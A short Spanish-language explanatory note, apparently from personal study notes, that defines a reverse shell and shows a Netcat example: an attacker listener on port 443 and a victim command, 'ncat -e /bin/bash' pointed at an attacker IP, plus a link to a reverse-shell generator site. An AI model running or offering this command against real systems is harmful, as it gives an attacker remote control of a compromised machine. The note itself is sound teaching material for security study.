Una "reverse shell" es una técnica utilizada en el campo de la ciberseguridad y la piratería informática. En una comunicación típica de red, un cliente (por ejemplo, un navegador web) se conecta a un servidor (por ejemplo, un servidor web) para solicitar recursos o servicios. Sin embargo, en una "reverse shell", el flujo normal se invierte.

En una "reverse shell", el objetivo es que un dispositivo comprometido (la "víctima") establezca una conexión saliente hacia el atacante (el "atacante" o "controlador"). Esto significa que la víctima ejecuta un código malicioso que permite que el atacante tome el control del dispositivo comprometido a través de una conexión de red. Una vez que se ha establecido esta conexión, el atacante puede enviar comandos al dispositivo comprometido y recibir las respuestas, lo que le permite ejecutar acciones arbitrarias en el sistema comprometido. 

En el siguiente ejemplo se muestra (con [[Netcat]] la forma de una reverse shell)

**Máquina del atacante**

Primero el atacante se pone en escucha con el siguiente comando en un [[puerto]] en específico.

```nc -nlvp 443```

**Máquina victima**

Una vez que la máquina del atacante se encuentre en escucha y previamente con el acceso a la máquina víctima aplicas el siguiente comando para tener una consola:

```ncat -e /bin/bash 198.168.0.1```

----
Página para reverse shell:

https://www.revshells.com
